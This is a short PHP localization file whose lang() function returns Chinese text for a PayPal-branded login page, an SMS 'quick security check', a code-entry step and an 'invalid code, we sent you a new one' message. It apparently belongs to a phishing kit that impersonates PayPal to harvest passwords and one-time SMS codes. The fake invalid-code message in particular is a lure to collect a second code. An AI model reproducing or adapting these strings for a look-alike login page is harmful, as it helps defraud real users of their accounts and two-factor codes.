<?php

function lang($phrase){
    static $lang = array(
        '1' => '登录到您的PayPal账户',
        '2' => '电子邮件或手机号码',
        '3' => '密码',
        '4' => '忘记密码？',
        '5' => '登录',
        '6' => '或',
        '7' => '注册',
        '8' => '英语',
        '9' => '法语',
        '10' => '西班牙语',
        '11' => '中文',
        '12' => '快速安全检查',
        '13' => '我们只需要一些额外的信息来确认是您本人。',
        '14' => '接收短信',
        '15' => '继续，您确认您有权使用此电话号码，并同意接收短信以确认本次会话中的身份。可能会收取运营商费用。我们可能会从您的无线运营商那里接收订户和设备详细信息，用于风险和欺诈目的。',
        '16' => '下一步',
        '17' => '输入您的代码',
        '18' => '重新发送',
        '19' => '继续',
        '20' => '联系我们',
        '21' => '隐私',
        '22' => '法律',
        '23' => '政策更新',
        '24' => '全球',
        '25' => '无效的代码。我们已向您发送新代码。',
    );

    return $lang[$phrase];
}
?>
